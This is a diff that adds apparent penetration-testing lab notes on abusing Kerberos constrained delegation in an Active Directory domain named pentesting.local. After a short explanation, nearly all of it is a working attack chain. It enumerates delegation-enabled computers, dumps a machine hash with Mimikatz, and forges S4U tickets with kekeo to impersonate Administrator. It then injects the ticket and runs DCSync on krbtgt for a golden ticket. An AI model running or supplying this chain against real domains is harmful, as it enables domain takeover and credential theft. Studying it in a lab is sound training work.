@@ -1,0 +1,33 @@
+
+Kerberos constrained delegation was introduced in Windows Server 2003 to provide a safer form of delegation that could be used by services. 
+When it is configured, constrained delegation restricts the services to which the specified server can act on the behalf of a user. 
+This requires domain administrator privileges to configure a domain account for a service and is restricts the account to a single domain. 
+In today's enterprise, front-end services are not designed to be limited to integration with only services in their domain.
+
+#Enumerate
+Get-DomainComputer -TrustedToAuth
+
+#msds-allowedtodelegateto
+
+
+. .\Invoke-Mimikatz.ps1
+invoke-mimikatz
+aa81bb97a48748ad89541137bf78001f
+
+#ask dc for a tgt for the student server
+#Download kekeo:
+https://github.com/gentilkiwi/kekeo/releases
+kekeo.exe
+tgt::ask /user:student$ /domain:pentesting.local /rc4:aa81bb97a48748ad89541137bf78001f
+
+#ask dc for a tgs for the student server
+tgs::s4u /tgt:TGT_student$@PENTESTING.LOCAL_krbtgt~pentesting.local@PENTESTING.LOCAL.kirbi /user:Administrator@pentesting.local /service:time/ad.pentesting.local|ldap/ad.pentesting.local
+
+#use the tgs and inject it
+. ..\..\invoke-mimikatz.ps1
+Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@pentesting.local@PENTESTING.LOCAL_student$@PENTESTING.LOCAL.kirbi"'
+
+#Dcsync to perform a goldent ticket attack
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:pentesting\krbtgt"'
+
+
